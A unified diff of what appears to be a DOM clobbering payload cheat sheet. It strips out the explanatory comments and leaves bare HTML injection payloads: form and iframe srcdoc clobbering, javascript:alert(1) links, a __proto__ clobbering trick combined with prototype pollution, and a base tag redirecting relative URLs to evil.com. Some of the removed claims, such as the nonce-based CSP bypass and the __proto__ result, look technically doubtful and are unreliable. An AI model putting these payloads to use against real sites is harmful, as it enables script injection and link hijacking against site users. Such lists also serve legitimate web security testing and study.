@@ -1,51 +1,22 @@
-# ============================================================
-# DOM Clobbering — Advanced Techniques
-# ============================================================
-
-# ---- Multi-Level Clobbering ----
-# Clobber: x.y.z
-# Method 1: form + input + id
 <form id=x name=y><input id=x name=z></form>
-# Method 2: iframe (if contentWindow accessible)
 <iframe id=x name=y srcdoc="<a id=z href=//evil.com>"></iframe>
 
-# ---- CSP Bypass via DOM Clobbering ----
-# If CSP blocks inline scripts but allows nonce via DOM clobbering:
 <script id=x nonce=VALIDNONCE>alert(1)</script>
-# Then: document.getElementById('x').nonce = 'valid'
 
-# ---- HTML5 id/name Collision ----
-# Both id and name attributes create window properties
 <input id=x name=x value=clobbered>
 <img id=x name=x src=x>
 
-# ---- Clobber DOMParser ----
 <form id=DOMParser></form>
 
-# ---- Clobber jQuery Object ----
-# If jQuery(selector) used for config:
 <a id=config href="javascript:alert(1)">
 
-# ---- Clobber location ----
-# <input id=location value="javascript:alert(1)">
-# If code does: eval(location) or location.toString()
-
-# ---- Clobber currentScript ----
 <script id=currentScript>
-# window.currentScript gets clobbered during HTML parsing
 
-# ---- iframe srcdoc Clobber ----
 <iframe srcdoc="<a id=x href=javascript:alert(1)></a>"></iframe>
 <iframe srcdoc="<form id=x><input name=action value=javascript:alert(1)></form>"></iframe>
 
-# ---- SVG Clobber ----
 <svg><a id=x href=javascript:alert(1)>
 
-# ---- Prototype Pollution via DOM Clobbering ----
-# Combine with prototype pollution:
 <a id=__proto__><a id=__proto__ name=isAdmin href=true>
-# Results in: window.__proto__.isAdmin = "true"
 
-# ---- Clobber via Base Tag ----
 <base href=//evil.com>
-# All relative URLs now point to attacker server
